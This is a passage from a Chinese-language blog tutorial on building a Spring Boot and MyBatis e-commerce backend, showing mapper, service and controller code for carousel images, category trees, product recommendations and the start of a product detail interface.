<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712105512286.png" alt="image-20220712105512286"></p>
<pre><code class="hljs mysql">SELECT * FROM index_img WHERE `status` = 1 ORDER BY seq</code></pre>
</li>
<li><p>在IndexImgMapper定义方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IndexImgMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GeneralDao</span>&lt;IndexImg&gt; &#123;
    <span class="hljs-keyword">public</span> List&lt;IndexImg&gt; <span class="hljs-title function_">listIndexImgs</span><span class="hljs-params">()</span>;
&#125;</code></pre>
</li>
<li><p>配置映射文件</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;listIndexImgs&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.IndexImg&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    SELECT * FROM index_img WHERE `status` = 1 ORDER BY seq
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>业务逻辑实现</p>
<p>IndexImgServiceImpl添加以下内容</p>
<pre><code class="hljs java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexImgServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IndexImgService</span> &#123;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> IndexImgMapper indexImgMapper;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listIndeximgs</span><span class="hljs-params">()</span> &#123;

        List&lt;IndexImg&gt; indexImgs = indexImgMapper.listIndexImgs();
        <span class="hljs-keyword">if</span>(indexImgs.size() == <span class="hljs-number">0</span>)&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-literal">null</span>);
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>,indexImgs);
    &#125;
&#125;</code></pre>
</li>
<li><p>接口实现</p>
<p>IndexImgController</p>
<pre><code class="hljs java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/index&quot;)</span>
<span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexImgsController</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> IndexImgService indexImgService;

    <span class="hljs-meta">@GetMapping(&quot;/indeximg&quot;)</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">addGoods</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> ResultVO.success(indexImgService.listIndeximgs());
    &#125;
&#125;
</code></pre></li>
</ul>
<h3 id="1-5-分类列表"><a href="#1-5-分类列表" class="headerlink" title="1.5 分类列表"></a>1.5 分类列表</h3><p>接口开发</p>
<ul>
<li><p>数据库分析</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712130956027.png" alt="image-20220712130956027"></p>
</li>
<li><p>添加实体类CategoryVO</p>
<p>与category的区别在于多了一个属性用于存放子标题</p>
<pre><code class="hljs abnf">List&lt;CategoryVO&gt; categoryVOList<span class="hljs-comment">;</span></code></pre>
</li>
<li><p>dao实现</p>
<ul>
<li><p>方法一</p>
<p>使用递归sql查询数据库</p>
<p>dao代码</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title function_">getCategoryList2</span><span class="hljs-params">(<span class="hljs-type">int</span> parentId)</span>;</code></pre>

<p>mapper映射文件</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.CategoryVO&quot;</span>&gt;</span>
    <span class="hljs-comment">&lt;!--</span>
<span class="hljs-comment">      WARNING - @mbg.generated</span>
<span class="hljs-comment">    --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryName&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_level&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryLevel&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;parent_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;parentId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_icon&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryIcon&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_slogan&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categorySlogan&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_pic&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryPic&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_bg_color&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryBgColor&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryVOList&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao.CategoryMapper.getCategoryList2&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getCategoryList2&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.CategoryVO&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ResultMap&quot;</span>&gt;</span>
      select * from category where parent_id = #&#123;parentId&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
</code></pre>
</li>
<li><p>方法二</p>
<p>直接获取所有分类的数据后，在java代码中进行级别分类的处理，可以大大提高处理效率</p>
</li>
</ul>
</li>
<li><p>service代码实现</p>
<ul>
<li><p>方法一</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title function_">getCategoryList</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-keyword">return</span> categoryMapper.getCategoryList2(<span class="hljs-number">0</span>);
&#125;</code></pre>


</li>
<li><p>方法二</p>
<pre><code class="hljs java">    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title function_">getCategoryList</span><span class="hljs-params">()</span> &#123;
        List&lt;Category&gt; categories = categoryMapper.getCategoryList();
        List&lt;CategoryVO&gt; categoryVOS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-comment">// 获取所有的一级标题</span>
        <span class="hljs-keyword">for</span> (Category category : categories) &#123;
            <span class="hljs-type">CategoryVO</span> <span class="hljs-variable">categoryVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CategoryVO</span>();
            <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">1</span>)&#123;
                BeanUtils.copyProperties(category, categoryVO);
                categoryVOS.add(categoryVO);
            &#125;
        &#125;
        <span class="hljs-comment">// 将一级标题下的二级标题添加到setCategoryVOList属性中</span>
        <span class="hljs-keyword">for</span> (CategoryVO categoryVO : categoryVOS) &#123;
            List&lt;CategoryVO&gt; category2List = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            <span class="hljs-keyword">for</span> (Category category : categories) &#123;
                <span class="hljs-comment">// 筛选条件为 二级标题且父标题与一级标题一致</span>
                <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">2</span> &amp;&amp; category.getParentId().equals(categoryVO.getCategoryId()))&#123;
                    <span class="hljs-type">CategoryVO</span> <span class="hljs-variable">categoryvo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CategoryVO</span>();
                    BeanUtils.copyProperties(category, categoryvo);
                    category2List.add(categoryvo);
                &#125;
            &#125;
            categoryVO.setCategoryVOList(category2List);
<span class="hljs-comment">//            System.out.println(categoryVO);</span>
        &#125;
        <span class="hljs-keyword">for</span> (CategoryVO categoryVO : categoryVOS) &#123;

            <span class="hljs-keyword">for</span>(CategoryVO categoryVO2: categoryVO.getCategoryVOList())&#123;  <span class="hljs-comment">//遍历所有二级标题</span>
                List&lt;CategoryVO&gt; category3List = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(); <span class="hljs-comment">//保存三级标题的数组</span>
                <span class="hljs-keyword">for</span> (Category category : categories) &#123;
                    <span class="hljs-comment">// 筛选符合条件的三级标题 存放到二级标题的 categoryVOList中</span>
                    <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">3</span> &amp;&amp; category.getParentId().equals(categoryVO2.getCategoryId()))&#123;
                        <span class="hljs-type">CategoryVO</span> <span class="hljs-variable">categoryvo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CategoryVO</span>();
                        BeanUtils.copyProperties(category, categoryvo);
                        category3List.add(categoryvo);
                    &#125;
                &#125;
                categoryVO2.setCategoryVOList(category3List);
            &#125;
            System.out.println(categoryVO);
        &#125;
        <span class="hljs-keyword">return</span> categoryVOS;
    &#125;</code></pre></li>
</ul>
</li>
<li><p>controller实现</p>
<pre><code class="hljs java">    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> CategoryService categoryService;
    <span class="hljs-meta">@GetMapping(&quot;/category-list&quot;)</span>
    <span class="hljs-meta">@ApiOperation(value = &quot;获取首页分类数据&quot;)</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getCategoryList</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> ResultVO.success(categoryService.getCategoryList1());
<span class="hljs-comment">//        return ResultVO.success(categoryService.getCategoryList2());</span>
    &#125;</code></pre>

<p>实测方法二比方法一的响应速度要快很多倍，所以还是减少在数据库中进行数据的处理。</p>
<table>
<thead>
<tr>
<th>方法一</th>
<th>方法二</th>
</tr>
</thead>
<tbody><tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712173631776.png" alt="image-20220712173631776"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712173546986.png" alt="image-20220712173546986"></td>
</tr>
</tbody></table>
<p>实现效果如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712174710162.png" alt="image-20220712174710162"></p>
</li>
</ul>
<h3 id="1-6-商品推荐"><a href="#1-6-商品推荐" class="headerlink" title="1.6 商品推荐"></a>1.6 商品推荐</h3><blockquote>
<p>推荐商品原则可以是 1.根据商城销量推荐2.推荐商城最新上架的商品</p>
<p>说明：商品推荐算法是根据多个维度进行权重计算的结果，计算出一个匹配值</p>
</blockquote>
<ul>
<li><p>数据库操作</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712175743195.png" alt="image-20220712175743195"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712175819883.png" alt="image-20220712175819883"></p>
<pre><code class="hljs mysql">select * from product order by create_time desc limit 0,3;</code></pre>
</li>
<li><p>添加实体类ProdoctVO</p>
<p>与product的区别在于多一个属性用于存在与该产品相关的图片</p>
<pre><code class="hljs typescript"><span class="hljs-keyword">private</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">ProductImg</span>&gt; imgs;

<span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">ProductImg</span>&gt; <span class="hljs-title function_">getImgs</span>(<span class="hljs-params"></span>) &#123;
<span class="hljs-keyword">return</span> imgs;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setImgs</span>(<span class="hljs-params">List&lt;ProductImg&gt; imgs</span>) &#123;
<span class="hljs-variable language_">this</span>.<span class="hljs-property">imgs</span> = imgs;
&#125;</code></pre>
</li>
<li><p>dao实现</p>
<ul>
<li><p>ProductDao</p>
<pre><code class="hljs java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GeneralDao</span>&lt;Product&gt; &#123;
    <span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title function_">getRecommendProduct</span><span class="hljs-params">()</span>;
&#125;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;root_category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;rootCategoryId&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sold_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;soldNum&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productStatus&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;LONGVARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;content&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getRecommendProduct&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Product&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select * from product order by create_time desc limit 0,3;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>ProductImgDao</p>
<pre><code class="hljs java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductImgMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GeneralDao</span>&lt;ProductImg&gt; &#123;
    <span class="hljs-keyword">public</span> List&lt;ProductImg&gt; <span class="hljs-title function_">getProductImgsById</span><span class="hljs-params">(<span class="hljs-type">int</span> productId)</span>;
&#125;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;id&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;itemId&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;url&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sort&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sort&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_main&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isMain&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;created_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createdTime&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;updated_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updatedTime&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getProductImgsById&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.ProductImg&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select * from product_img where item_id = #&#123;productId&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li>
</ul>
</li>
<li><p>service代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Resource</span>
<span class="hljs-keyword">private</span> ProductMapper productMapper;

<span class="hljs-meta">@Resource</span>
<span class="hljs-keyword">private</span> ProductImgMapper productImgMapper;


<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> List&lt;ProductVO&gt; <span class="hljs-title function_">getRecommendProductList</span><span class="hljs-params">()</span> &#123;
    List&lt;Product&gt; recommendProductList = productMapper.getRecommendProduct();

    List&lt;ProductVO&gt; productVOS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (Product product : recommendProductList) &#123;
        <span class="hljs-type">ProductVO</span> <span class="hljs-variable">productVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductVO</span>();
        List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId()));
        BeanUtils.copyProperties(product, productVO);
        productVO.setImgs(imgs);
        productVOS.add(productVO);
    &#125;
    <span class="hljs-keyword">return</span> productVOS;
&#125;</code></pre>
</li>
<li><p>controller代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> ProductService productService;
<span class="hljs-meta">@GetMapping(&quot;/list-recommends&quot;)</span>
<span class="hljs-meta">@ApiOperation(value = &quot;获取商品推荐数据&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getRecommendsList</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">return</span> ResultVO.success(productService.getRecommendProductList());
&#125;</code></pre>

<p>测试结果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712183632458.png" alt="image-20220712183632458"></p>
</li>
</ul>
<h3 id="1-7-分类商品推荐"><a href="#1-7-分类商品推荐" class="headerlink" title="1.7 分类商品推荐"></a>1.7 分类商品推荐</h3><blockquote>
<p>一次性加载所有分类的推荐商品，整体完成初始化</p>
<p>分别获取所有一级标题下销量最高的六个商品</p>
<p>返回查询到的6个商品</p>
</blockquote>
<ul>
<li><p>sql语句</p>
<pre><code class="hljs mysql">  
from product
where root_category_id = rootId and product_status = 1
order by sold_num desc
limit 0,6;</code></pre>

<p>获取到rootId下销量前六的商品信息</p>
</li>
<li><p>dao</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title function_">getRecommendByCategory</span><span class="hljs-params">(<span class="hljs-type">int</span> rootId)</span>;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getRecommendByCategory&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Product&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select *
    from product
    where root_category_id = #&#123;rootId&#125; and product_status = 1
    order by sold_num desc
    limit 0,6;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> List&lt;CategoryDTO&gt; <span class="hljs-title function_">getRecommendByCategory</span><span class="hljs-params">()</span> &#123;
    List&lt;Category&gt; categoryList = categoryMapper.getCategoryList(); <span class="hljs-comment">// 获取所有的分类</span>
    List&lt;CategoryDTO&gt; categoryDTOList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(); <span class="hljs-comment">// 用于保存结果</span>
    <span class="hljs-keyword">for</span> (Category category : categoryList) &#123;
        <span class="hljs-keyword">if</span> (category.getCategoryLevel() == <span class="hljs-number">1</span>) &#123;
            <span class="hljs-type">CategoryDTO</span> <span class="hljs-variable">categoryDTO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CategoryDTO</span>();
            List&lt;ProductVO&gt; productVOList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            List&lt;Product&gt; productList = productMapper.getRecommendByCategory(category.getCategoryId());
            <span class="hljs-comment">// 根据root_category_id筛选属于该一级分类的商品</span>
            <span class="hljs-keyword">for</span> (Product product : productList) &#123;
                <span class="hljs-comment">//  将产品的图片查询出来加入到productVO的imgs属性中</span>
                <span class="hljs-type">ProductVO</span> <span class="hljs-variable">productVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductVO</span>();
                List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId()));
                BeanUtils.copyProperties(product, productVO);
                productVO.setImgs(imgs);
                productVOList.add(productVO);
            &#125;
            <span class="hljs-comment">// 将处理得到的productVOList加入到CategoryDTO的products属性中</span>
            categoryDTO.setProducts(productVOList);
            BeanUtils.copyProperties(category, categoryDTO);
            categoryDTOList.add(categoryDTO);
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> categoryDTOList;
&#125;</code></pre>

<p>** 该方法实现的有点复杂，并且效率比较低，可以采用联合查询的方法进行优化</p>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/category-recommends&quot;)</span>
<span class="hljs-meta">@ApiOperation(value = &quot;根据商品分类销量前六推荐商品&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getRecommendByCategoryList</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">return</span> ResultVO.success(productService.getRecommendByCategory());
&#125;</code></pre>

<p>接口测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712235308867.png" alt="image-20220712235308867"></p>
<p>前端实现效果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712235328090.png" alt="image-20220712235328090"></p>
</li>
</ul>
<h3 id="1-8-商品详情"><a href="#1-8-商品详情" class="headerlink" title="1.8 商品详情"></a>1.8 商品详情</h3><blockquote>
<p>点击首页推荐的商品、轮播图商品广告、商品列表页面点击商品，就会进入到商品的详情页面</p>
<p>用户点击时，携带商品的id进行后端请求，后端接收到商品id后，进行数据库查询，返回详细信息</p>
<p>包括以下内容</p>
<p>1.商品的基本信息</p>
<p>2.商品的套餐信息</p>
<p>3.商品的图片信息</p>
<p>4.商品的评价信息</p>
<p>5.商品的参数信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713104403656.png" alt="image-20220713104403656"></p>
<h4 id="商品详情接口"><a href="#商品详情接口" class="headerlink" title="商品详情接口"></a>商品详情接口</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713110111555.png" alt="image-20220713110111555"></p>
<p>接口所需信息如下，只需要三个单表查询即可完成，因此dao层可以直接使用tkMapper提供的接口</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getProductBasicInfo</span><span class="hljs-params">(String productId)</span> &#123;
    <span class="hljs-comment">//1.商品基本信息</span>
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(Product.class);
    Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
